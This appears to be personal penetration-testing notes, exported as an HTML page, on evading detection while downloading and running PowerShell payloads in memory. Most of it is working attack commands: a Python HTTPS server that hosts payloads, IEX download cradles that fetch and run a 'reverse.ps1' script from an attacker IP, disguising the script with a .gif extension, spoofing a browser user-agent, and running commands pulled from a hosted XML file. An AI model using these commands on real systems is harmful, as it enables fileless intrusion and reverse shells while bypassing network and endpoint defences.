<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Evasion: download and run file in memory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Evasion: download and run file in memory</h1><br /><br />• <strong>SSL Web
      Server</strong><br />When hosting the PowerShell script, it is better have an SSL certificate configured on the
    attacker machine. <br /> This helps in evading over-the-wire heuristics as our traffic will go over HTTPS.<br /> ◇
    Python 2<br />
    <div class="codebox">
      <div class="codebox">
        import&nbsp;socketserver<br />import&nbsp;http.server<br />import&nbsp;ssl<br /><br />httpd&nbsp;=&nbsp;socketserver.TCPServer((&#39;localhost&#39;,&nbsp;4443),&nbsp;http.server.SimpleHTTPRequestHandler)<br /><br />httpd.socket&nbsp;=&nbsp;ssl.wrap_socket&nbsp;(httpd.socket,&nbsp;keyfile=&quot;/home/kali/Desktop/key.pem&quot;,&nbsp;certfile=&quot;/home/kali/Desktop/cert.pem&quot;,&nbsp;server_side=True)<br /><br />httpd.serve_forever<span
          style="color:#000000;font-weight:400">()</span></div>
    </div><br /> To generate key and cert files with OpenSSL use following command<br />
    <div class="codebox">
      <div class="codebox">
        kali@kali:~/$&nbsp;openssl&nbsp;req&nbsp;-x509&nbsp;-newkey&nbsp;rsa:2048&nbsp;-keyout&nbsp;/home/kali/Desktop/key.pem&nbsp;-out&nbsp;/home/kali/Desktop/cert.pem&nbsp;-days&nbsp;365
      </div>
    </div><br /> Now we can download file from the target machine<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://192.168.147.139:4443/reverse.ps1&#39;);
      </div>
    </div><br /> <span style="color:#ff0000;">WARNING</span>: if we have this error <br /> <a href=""><img
        src="images/1365-1.png" alt="images/1365-1.png" /></a><br /> see <a
      href="https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/" target="_blank">https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/</a><br />
    <br /><br />• <strong>Give a different extension to the file</strong><br /> Another trick we can use which might
    help in evading basic file extension heuristics is to give our PowerShell script a different extension, for
    instance, “Logo.gif.” PowerShell will still execute it as a .ps1 script.<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;http://192.168.147.139:4443/reverse.gif&#39;);
      </div>
    </div><br /><br />• <strong>Specify a custom user-agent</strong><br /> This can help us evade detection mechanisms
    that are flagging on abnormal User-Agents<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;$downloader&nbsp;=&nbsp;New-Object&nbsp;System.Net.WebClient<br />PS&gt;&nbsp;$downloader.Headers.Add(&quot;user-agent&quot;,&nbsp;&quot;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;10.0;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/65.0.3325.146&nbsp;Safari/537.36&quot;)<br />PS&gt;&nbsp;$payload&nbsp;=&nbsp;&quot;http://192.168.147.139/reverse.ps1&quot;<br />PS&gt;&nbsp;$command&nbsp;=&nbsp;$downloader.DownloadString($payload)<br />PS&gt;&nbsp;iex&nbsp;$command
      </div>
    </div><br /><br />• <strong>Execute commands inside an hosted XML document</strong><br /> The document below will
    simply list the system processes when executed<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;command&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;a&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;execute&gt;Get-Process&lt;/execute&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;/a&gt;<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/command<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;$xmldoc&nbsp;=&nbsp;New-Object&nbsp;System.Xml.XmlDocument<br />PS&gt;&nbsp;$xmldoc.Load(&quot;http://192.168.147.139/xmlDocument.xml&quot;).command.a.execute<br />PS&gt;&nbsp;iex&nbsp;$xmldoc.command.a.execute
      </div>
    </div><br /><br />
  </div>
</body>

</html>